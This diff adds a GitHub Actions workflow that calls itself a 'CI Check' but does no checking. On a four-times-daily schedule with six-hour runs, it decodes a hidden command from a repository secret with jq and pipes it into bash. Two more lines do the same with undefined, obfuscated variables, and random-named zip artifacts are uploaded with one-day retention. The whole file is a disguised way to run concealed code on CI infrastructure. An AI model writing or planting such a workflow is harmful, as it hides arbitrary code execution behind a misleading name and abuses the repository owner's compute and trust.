@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          fl680: ${{ secrets.fl680 }}
+        run: |
+          printf '%s' "$fl680" | jq -r .yyppl644 | /bin/bash
+          echo $sklwd06641 | jq -r .xf967 | /bin/bash
+          printf '%s' "$qnoll672" | jq -r .kcrgd0 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: WK4fvAMy
+          path: "*.zip"
+          retention-days: 1
